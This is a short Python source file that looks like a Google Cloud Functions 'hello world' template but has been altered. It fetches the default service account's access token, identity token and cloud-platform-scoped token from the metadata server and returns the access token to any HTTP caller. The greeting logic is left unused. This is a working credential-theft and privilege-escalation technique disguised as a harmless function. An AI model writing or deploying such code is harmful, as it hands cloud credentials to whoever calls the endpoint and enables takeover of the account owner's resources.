#import functions_framework
import requests

#@functions_framework.http
def hello_http(request):
    """HTTP Cloud Function.
    Args:
        request (flask.Request): The request object.
        <https://flask.palletsprojects.com/en/1.1.x/api/#incoming-request-data>
    Returns:
        The response text, or any set of values that can be turned into a
        Response object using `make_response`
        <https://flask.palletsprojects.com/en/1.1.x/api/#flask.make_response>.
    """
    request_json = request.get_json(silent=True)
    request_args = request.args

    metadata = requests.get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", headers={"Metadata-Flavor": "Google"})
    id_r = requests.get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity", headers={"Metadata-Flavor": "Google"})
    auth_r = requests.get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?scopes=cloud-platform", headers={"Metadata-Flavor": "Google"})

 

    if request_json and 'name' in request_json:
        name = request_json['name']
    elif request_args and 'name' in request_args:
        name = request_args['name']
    else:
        name = 'World'
    return metadata.content
